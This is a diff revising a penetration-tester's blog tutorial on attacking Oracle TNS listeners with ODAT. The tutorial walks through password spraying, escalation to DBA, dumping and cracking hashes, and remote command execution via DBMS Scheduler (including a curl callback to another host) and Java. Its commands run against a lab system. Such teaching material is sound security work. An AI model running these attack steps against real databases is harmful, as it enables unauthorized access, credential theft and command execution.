@@ -1,11 +1,9 @@
 # Oracle TNS Listeners: A Practical Attack Path
-In this post, I'll walk through my standard methodology and attack path for testing Oracle Databases via their TNS Listeners. While there are more in-depth resources linked at the bottom, this guide consolidates everything you need in one place. Whether you're encountering these for the first time or looking to refine your approach, I hope you'll find something useful here.
+In this post, I'll walk through my standard methodology and attack path for testing Oracle Databases via their TNS Listeners. Whether you're encountering these for the first time or looking to refine your approach, I hope you'll find something useful here. This guide focuses on attacking TNS listeners running on Linux systems. While they can run on Windows Servers, I rarely encounter that in practice. This methodology can be used for Windows Servers as well, but file paths, module usages, and other differences will need to be adjusted accordingly.
 
 If you've done internal network testing, you've almost certainly seen Oracle TNS listeners. They're common in Oracle-based environments and come packaged with products like Oracle E-Business Suite (EBS). In these environments, the databases are the crown jewels, holding all the sensitive data you'd want to protect. For offensive security practitioners, they're priority targets for demonstrating impact. Depending on network segmentation, they can also provide pivot points to reach otherwise isolated hosts.
 
 Big shoutout to [@quentinhardy](https://github.com/quentinhardy) for creating [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat), which I use for nearly every step of Oracle database testing.
-
->This guide focuses on attacking TNS listeners running on Linux systems. While they can run on Windows Servers, I rarely encounter that in practice.
 
 ## Identifying Oracle TNS/Databases
 When should you try this methodology? Anytime you find an Oracle TNS listener in scope. If you're using `nmap` or similar tools during engagements, these services are fairly easy to fingerprint.
@@ -83,9 +81,9 @@ sudo ln -s /usr/lib/x86_64-linux-gnu/libaio.so.1t64 /usr/lib/x86_64-linux-gnu/li
 sudo ldconfig
 ```
 
-I've covered the main issues I've encountered while using ODAT. If you run into other errors during setup, Google and ChatGPT are your friends. This tool likely will see few updates in the future, so some manual troubleshooting is expected. There's also a "Common Issues" section at the end of this post with additional fixes.
+I've covered the main issues I've encountered while installing ODAT. If you run into other errors during setup, Google and ChatGPT are your friends. This tool likely will see few updates in the future, so some manual troubleshooting is expected. There's also a "Troubleshooting" section at the end of this post with a fix for specific connection errors to TNS listeners.
 
->You can also containerize ODAT if you don't want to deal with dependency setup, though it's not as simple as building a Dockerfile—you'll need to grab the Oracle client packages as well. See the [Docker Instructions](https://github.com/quentinhardy/odat/tree/master-python3/Docker).
+>You can also containerize ODAT if you don't want to deal with dependency setup, though you'll still need to grab the Oracle client packages. See the [Docker Instructions here](https://github.com/quentinhardy/odat/tree/master-python3/Docker).
 
 # Initial Access
 ## SID/Service Name Identification
@@ -125,7 +123,7 @@ python3 odat.py all -s 192.168.187.135 -p 1521
 [-] No one SID or Service Name has been found. Impossible to continue
 ```
 
-Typically, admins of these resources will have a specific naming convention for these values, and building a custom wordlist will give you the best possible outcome. Building the wordlist can be done with any info you have on the environment. Hostnames or application names are often used as TNS listener `SIDs` and `Service Names`. Trying `hostname` with random digits up to 3 values has worked for me before.
+Typically, admins of these resources will have a specific naming convention for these values, and building a custom wordlist will give you the best possible outcome. Building the wordlist can be done with any info you have on the environment. Hostnames or application names are often used as TNS listener `SIDs` and `Service Names`. Trying `hostname` with random digits up to three (3) values has worked for me before.
 
 Here is an example of running ODAT with a custom wordlist that finds a valid `Service Name` using the `snguesser` module (`sidguesser` is the other module for `SIDs` specifically):
 
@@ -148,7 +146,7 @@ The more information you can uncover via recon, the better chance of successfull
 ## Getting User Access
 Once you have a valid `SID` or `Service Name`, you can move on to attempting to log in as a database user. If you did not find any usernames or potential credential pairs in your previous recon, I would run ODAT's `passwordguesser` module to see if any accounts have default values.
 
->I would not recommend attempting more than 2 passwords on each account to avoid account lockout. This can be configured differently for any given TNS listener, but it would be safe to assume it is set to 3 attempts at most aggressive.
+>I would not recommend attempting more than two (2) passwords on each account to avoid account lockout. This can be configured differently for any given TNS listener, but it would be safe to assume it is set to three (3) attempts at most aggressive.
 
 Here is an example running with the built-in account wordlist:
 
@@ -174,9 +172,9 @@ apps/apps
 apps_ne/apps
 ```
 
-In my environment (which is a test Oracle EBS system), we see some defaults are in use and found. If this were a real environment the `apps` account is pretty much game over for all EBS specific data. However, as a hardening technique, these accounts are often not allowed to create remote database connections. Let's just pretend we did not find these accounts and move on to a targeted spray. Let's say we found a spreadsheet on an SMB share that had database account names in it which gives us a username list.
+In my environment (which is a test Oracle EBS system), we see some defaults are in use and found. If this were a real environment the `apps` account is pretty much game over for all EBS specific data. However, as a hardening technique, these accounts are often not allowed to create remote database connections. Let's assume we cannot connect with these accounts remotely and move on to a targeted spray.
 
-As seen above, something widespread in these Oracle environments is accounts having their username as their password. Why this was ever a standard... don't ask me. If you find usernames, I would first spray them with their usernames as their passwords and see if any of those work. If that doesn't, you are left with guessing the most common, `Welcome1` is pretty dang common and would be my followup.
+As seen above, something widespread in these Oracle environments is accounts having their username as their password. Why this was ever a standard... don't ask me. If you find usernames, I would first spray them with their usernames as their passwords and see if any of those work. If that doesn't, you are left with guessing. Common passwords can be environment-specific, but in Oracle environments I find that `Welcome1` is widely used and would be my first guess.
 
 >Case sensitivity is not always enabled in Oracle TNS listeners either. Keep that in mind for password spraying and password cracking (later).
 
@@ -193,10 +191,10 @@ python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB --accounts-f
 STEPHEN_ADAMS/STEPHEN_ADAMS
 ```
 
-With a valid user credential in hand, you can move onto the juicy stuff. In my experience, once you have a valid credential, you have a great chance to turn this into a full database compromise. That is because we can dump out the full database user list to try to password spray, and if you are lucky, you may already have dangerous permissions assigned to your compromised account.
+With a valid user credential in hand, you can move onto the juicy stuff. In my experience, once you have a valid credential, you have a great opportunity to turn initial access into a full database compromise.
 
 ## Mapping Out the Database
-With the user credential in hand, you can now connect and take a look around. Any SQL client such as `sqlplus` can be used to do that and interact with SQL. I am going to stick to showing ODAT functionality here to make things quicker.
+With the user credential in hand, you can now connect and take a look around. Any SQL client such as `sqlplus` can be used to do that and interact with SQL. I am going to stick to showing mostly ODAT functionality here to make things quicker.
 
 ### Database Information Gathering
 ODAT has a `search` module which can be used to get info about the database you are connected to. This is very helpful to run on your first compromised user to get several items, such as password lockout policy, case sensitivity policy, all usernames, and much more.
@@ -332,12 +330,12 @@ STEPHEN_ADAMS/stephen_adams
 CUSTOM_DBA/custom_dba
 ```
 
-So we have some new accounts to go explore (RECON and CUSTOM_DBA ignoring APPS here).
+Now we have some new accounts to go explore.
 
 ### Enumerating Dangerous Functionality Access
-The next step I usually go for, is running the ODAT `all` module authenticated. This will showcase what dangerous functionalities we can use for further exploitation. However, I want to talk really quickly about some things you should know about this command. By default, it will run a username as password spray every time you run it, which for me is not really what I want it to do at this stage of the engagement. It will also leave artifacts in the database, as it does not completely clean up after itself. This is worth noting especially for production environments, where you don't want to be leaving test artifacts everywhere (especially dangerous ones).
+The next step I usually go for is running the ODAT `all` module authenticated. This will showcase what dangerous functionalities we can use for further exploitation. However, I want to talk really quickly about some things you should know about this command. By default, it will run a username as password spray every time you run it, which for me is not really what I want it to do at this stage of the engagement. It will also leave artifacts in the database, as it does not completely clean up after itself. This is worth noting especially for production environments, where you don't want to be leaving test artifacts everywhere (especially dangerous ones).
 
-I personally comment out the code in ODAT that runs the username as password spray during the authenticated module run. You can do this as well if you like, it is located in the `odat.py` file at both line 329 and 336 for SID and Service Name `all` runs respectively. You can just comment out the function call to `runUsernameLikePassword(args)`:
+I personally comment out the code in ODAT that runs the username as password spray during the authenticated module run. You can do this as well if you like, it is located in the `odat.py` file at both line 329 and 336 for SID and Service Name `all` runs respectively. You can comment out the function call to `runUsernameLikePassword(args)`:
 
 ```python
 	#C)ALL OTHERS MODULES
@@ -425,14 +423,14 @@ t (ACL) ORA-06512: at "SYS.UTL_HTTP", line 380 ORA-06512: at "SYS.UTL_HTTP", lin
 [+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database
 ```
 
-So we have a bunch of `[-] KO` here, meaning no useful access to anything dangerous. I find in real environments, you will have access to at least some of these. It is pretty common to see access to things such as the `UTL_FILE` library which allows reading and writing files to the operating system, or DBMS Scheduler access which can also allow remote command execution. The latter I see hardened more often set to run as the `nobody` user, but you might get lucky there.
+So we have a bunch of `[-] KO` here, meaning no useful access to anything dangerous. I find in real environments, you will have access to at least some of these. It is pretty common to see access to things such as the `UTL_FILE` library which allows reading and writing files to the operating system, or DBMS Scheduler access which can allow remote command execution. The latter I see hardened more often set to run as the `nobody` user, but you might get fortunate there.
 
 >This run does not leave database artifacts left over as this user was not able to do any of the attacks.
 
 ### Pivoting to Other Users
-In this section, I assume we either have compromised many users, or you already found a more permissive heavy user. I wanted to showcase a user that has some dangerous privileges and what the ODAT `all` module looks like here.
+In this section, I assume we either have compromised many users, or you already found a more permissive heavy user. I will showcase a user that has some dangerous privileges and what the ODAT `all` module looks like here.
 
-I recommend tracking what the account you have compromised "looks like" before running ODAT's `all` module, that way you can see if any artifacts are left over. I am using a JetBrains IDE to connect in these below screenshot examples, but you can use any tool you like. If I look at the `CUSTOM_DBA` user before running, they have nothing created in their namespace (it is a freshly created account after all):
+I recommend tracking what the account you have compromised "looks like" before running ODAT's `all` module, that way you can see if any artifacts are left over. I am using a [JetBrains IDE](https://www.jetbrains.com/datagrip/) to connect in these below screenshot examples, but you can use any tool you like. If I look at the `CUSTOM_DBA` user before running, they have nothing created in their namespace (it is a freshly created account after all):
 
 ![Database View](../images/oracle-databases1.png)
 
@@ -503,7 +501,7 @@ t (ACL) ORA-06512: at "SYS.UTL_HTTP", line 380 ORA-06512: at "SYS.UTL_HTTP", lin
 [+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database
 ```
 
-Okay, so we have access to the JAVA library and can also privilege escalate to the built-in role `DBA` using `CREATE/EXECUTE ANY PROCEDURE`. A quick side note is this user's privileges look like this when running the `privesc` module:
+Okay, so we have access to the `JAVA` library and can also privilege escalate to the built-in role `DBA` using `CREATE/EXECUTE ANY PROCEDURE`. A quick side note is this user's privileges look like this when running the `privesc` module with the `--get-detailed-privs` flag:
 
 ```bash
 python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --get-detailed-privs  
@@ -522,7 +520,7 @@ Let's see if any artifacts were leftover from running the `all` module:
 
 ![Database Artifacts](../images/oracle-databases2.png)
 
-So we can see 3 leftover procedures. The 2 `EXPLOIT` procedures have to do with confirming JAVA access, and the `GET_DBA_CREATE_ANY_INDEX` is testing privilege escalation to DBA via that privilege. I have also seen leftover created tables before, but again, it depends on what modules actually work. Be diligent in tracking what is leftover to ensure you can clean it up or document it being left over. This is a major part in understanding what your tools are actually doing, that way you can confirm what was your testing vs. something else (potential incident).
+We can see three (3) leftover procedures. The two (2) `EXPLOIT` procedures have to do with confirming `JAVA` access, and the `GET_DBA_CREATE_ANY_INDEX` is testing privilege escalation to `DBA` via that privilege. I have also seen leftover created tables before, but again, it depends on what modules actually work. Be diligent in tracking what is leftover to ensure you can clean it up or document it being left over. This is a major part in understanding what your tools are actually doing, that way you can confirm what was your testing vs. something else (potential incident).
 
 Since these live in our namespace, we can drop them accordingly:
 
@@ -593,14 +591,14 @@ python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUS
        - role: XDB_SET_INVOKER
 ```
 
-We see way more permissions now, including the newly assigned `DBA` role. I usually clean things up as I go in an engagement (unless we want to leave artifacts purposely), so now would be a good time to clean up the leftover `system.odatstoredproc` ODAT created to privilege escalate us:
+We see way more permissions now, including the newly assigned `DBA` role. I usually clean things up as I go in an engagement (unless we want to leave artifacts purposely), so now would be a good time to clean up the leftover `system.odatstoredproc` procedure ODAT created to privilege escalate us:
 
 ```sql
 [2025-11-27 00:34:43] CUSTOM_DBA> DROP PROCEDURE system.odatstoredproc
 [2025-11-27 00:34:44] completed in 38 ms
 ```
 
-You now have mostly full privileges over the database, but that still isn't the full power you would want it to be in some cases. The `DBA` role cannot override things created by the `SYS` account. In non-hardened environments this might be enough to read all tables, including those that have sensitive data. However, in environments where Row-Level Security (RLS) is defined, you usually have to get more creative or become the `SYS` user. Having the `DBA` role will allow you to use dangerous functionalities that can often give you the hash of the `SYS` account, or be able to impersonate them by executing SQL commands locally on the database server (remote command execution).
+At this point you have mostly full privileges over the database, but that still isn't the full power you would want it to be in some cases. The `DBA` role cannot override things created by the `SYS` account. In non-hardened environments this might be enough to read all tables, including those that have sensitive data. However, in environments where Row-Level Security (RLS) is defined, you usually have to get more creative or become the `SYS` user. Having the `DBA` role will allow you to use dangerous functionalities that can often give you the hash of the `SYS` account, or be able to impersonate them by executing SQL commands locally on the database server (remote command execution).
 
 Now if we run the `all` module in ODAT, we will have access to a lot more utilities to continue on our database system compromise journey (output is cut a bit for easier viewing):
 
@@ -642,8 +640,10 @@ python3 odat.py all -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_
 
 >Remember that the `all` run will leave over artifacts. I have talked about this prior, so I won't go over cleaning up again, but you will need to.
 
+Now we have access to plenty of other modules that can allow us to read files, dump oracle password hashes, and execute system commands. Let's talk about this in more detail next.
+
 #### Removing DBA (Cleanup)
-It is easy to remove the `DBA` role from your account with the following ODAT command:
+Once you are done playing around with elevated privileges, you will want to clean up and revoke the role grant. It is easy to remove the `DBA` role from your account with the following ODAT command:
 
 ```bash
 python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --revoke-dba-role  
@@ -654,8 +654,6 @@ python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUS
 11:03:55 INFO -: Trying to revoke DBA role from 'CUSTOM_DBA'  
 [+] The DBA role has been revoked from CUSTOM_DBA
 ```
-
-Now we have access to plenty of other modules that can allow us to read files, dump oracle password hashes, and execute system commands. Let's talk about this in more detail next.
 
 ## File Read/Write/Delete
 The following modules allow you to either read, write, or delete files, and are extremely useful in privilege escalating usually. All the methods are "blind" so you need to know the full paths of where you are reading/writing.
@@ -833,7 +831,7 @@ You could also likely pivot in the internal environment from here if the databas
 >In production environments, especially hardened ones, you won't be able to directly SSH into database nodes if network segmentation is set up correctly. I have not seen this much in my experience, but if available, it is the easiest way in.
 
 #### Password Authentication Files
-The above techniques to further escalate through `utlfile` are not all-inclusive, but are sufficient starting points. The last thing I want to talk about is password file authentication, which I have seen enabled in several environments. If you find yourself in an environment that has password file authentication enabled, you will want to search for `orapw` files. These files contain hashes for high-privilege users such as `SYS`.
+The above techniques to further escalate through `utlfile` are not all-inclusive, but are sufficient starting points. The last thing I want to highlight is password file authentication, which I have seen enabled in several environments. If you find yourself in an environment that has password file authentication enabled, you will want to search for `orapw` files. These files contain hashes for high-privilege users such as `SYS`.
 
 You can check if password file authentication is enabled with the following SQL query:
 ```sql
@@ -943,7 +941,7 @@ ORACLE_OCM; None; S:00000000000000000000000000000000000000004213FE43A82F8ECF1A24
 # ...SNIP...
 ```
 
-This dumps out the hashes in 3 different formats, raw, formatted for `john`, and formatted for `hashcat`. The latter of them is formatted as 10g hashes, so we can use `hashcat` with mode `-m 3100`. These are very weak hashes, and you can go pretty wild using rule sets to try to crack as many as you can.
+This dumps out the hashes in three (3) different formats, raw, formatted for `john`, and formatted for `hashcat`. The latter of them are formatted as 10g hashes, so we can use `hashcat` with mode `-m 3100`. These are very weak hashes, and you can go pretty wild using rule sets to try to crack as many as you can.
 
 Example of running `hashcat` with the dumped hashes:
 
@@ -1000,7 +998,7 @@ The `dbmsscheduler` module allows you to abuse the DBMS Scheduler to create a jo
 
 >The operating system user that runs the job is typically the `nobody` user. So while it is great to get command execution, we won't have a high-privilege user using this methodology unless we get lucky.
 
-The easiest way to confirm that your command is running is OOB (Out of Band) payloads. Here is an example of a curl callback:
+The easiest way to confirm that your command is running is OOB (Out of Band) payloads. Here is an example of a `curl` callback:
 
 ```bash
 python3 odat.py dbmsscheduler -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --exec '/usr/bin/curl -s http://192.168.187.134/helloworld'  
@@ -1072,10 +1070,12 @@ usr
 var
 ```
 
-### Java
-The `java` module is the best and most prevalent method of command execution, as it will run as the underlying database user on the operating system. There is a caveat to it, which is your need for the ability to grant Java permissions to yourself to use this method. (I.E Have the JAVA_ADMIN role or DBA)
+>The built-in reverse shell payload is for Python 2, and some environments may use Python 3 instead. You would need to change the payload accordingly in those situations.
 
-This module has a built-in pseudo shell, which is much more stealthy than using a reverse shell. Let's go ahead and test if our `CUSTOM_DBA` user who now possesses the `DBA` role can use this module:
+### Java
+The `java` module is the best method of command execution in my opinion, as it will run as the underlying database user on the operating system. There is a caveat to it, which is your need for the ability to grant Java permissions to yourself to use this method. (I.E Have the `JAVA_ADMIN` role or `DBA`)
+
+This module has a built-in pseudo shell, which is stealthier than using a reverse shell. Let's go ahead and test if our `CUSTOM_DBA` user who now possesses the `DBA` role can use this module:
 
 ```bash
 python3 odat.py java -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --exec /usr/bin/whoami  
@@ -1092,7 +1092,7 @@ Exception: the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not
 10:32:01 INFO -: Delete the java class compiled
 ```
 
-We see the error `the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not been granted to CUS...`, which means we don't have execute permission over `/bin/sh`. So while the `java` permissions are widely available to use by most Oracle database users in my experience, being able to actually self grant this permission is reserved for high-privilege users.
+We see the error `the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not been granted to CUS...`, which means we don't have execute permission over `/bin/sh`. So while the `java` library is widely available to database users in my experience, being able to actually self grant this permission is reserved for high-privilege Java users.
 
 Let's go ahead and give ourselves this permission:
 
@@ -1124,7 +1124,7 @@ oracle
 10:35:56 INFO -: Delete the java class compiled
 ```
 
-This is now working, and we can see that we are running as the `oracle` user. I believe you need to have the `JAVA_ADMIN` role to grant permissions such as this, which the `DBA` role includes inside it. We can now launch a pseudo shell and use that.
+This is now working, and we can see that we are running as the `oracle` user. We can now launch a pseudo shell and use that.
 
 >Note that in this pseudo shell, you must escape single quotes (`'`) as they are being interpreted by the Java execution. You can end up with some pretty complex escaping in this pseudo shell, so I would recommend getting an implant on the box for more post-exploitation activities.
 
@@ -1200,17 +1200,7 @@ We can get the `SEQ` number which in our case is `502` for the following command
 Annnnnnd voilà, back to where we began on these.
 
 # Conclusion
-
-This is my go-to attack path when testing Oracle TNS listeners. The workflow typically looks like this:
-
-1. **Identify** the TNS listener (usually via nmap)
-2. **Enumerate** valid SID/Service Names (combination of ODAT enumeration and passive recon)
-3. **Brute force** or guess credentials (ODAT's password lists or a target-specific wordlist)
-4. **Escalate** privileges (password file extraction, Java exploitation, UTL_FILE, or external tables)
-5. **Maintain access** and pivot as needed
-6. **Clean up** any artifacts left behind
-
-Oracle databases are high-value targets on internal networks. When you compromise one, you often gain access to sensitive business data and potential lateral movement opportunities. The techniques covered here—from basic authentication attacks to privilege escalation via Java permissions—represent the core of what you'll encounter during Oracle database assessments.
+Oracle databases are high-value targets on internal networks. When you compromise one, you often gain access to sensitive business data and potential lateral movement opportunities. The techniques covered here, from basic authentication attacks to remote command execution, represent the core attack paths of what you'll encounter during Oracle database assessments.
 
 Remember to always test responsibly within your scope, document everything for your reports, and clean up after yourself. Each environment is different, so adapt these techniques as needed for your specific target.
 
@@ -1289,6 +1279,7 @@ def isWorkingTnsListener(self):
 - Pyenv quick start: https://www.kali.org/docs/general-use/using-eol-python-versions/
 - Oracle Docs: https://docs.oracle.com
 - Article on cracking Oracle password files: https://laurent-leturgez.com/2017/12/15/brute-forcing-the-oracle-password-file/
+- Hashcat Example Hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
 
 
 ---
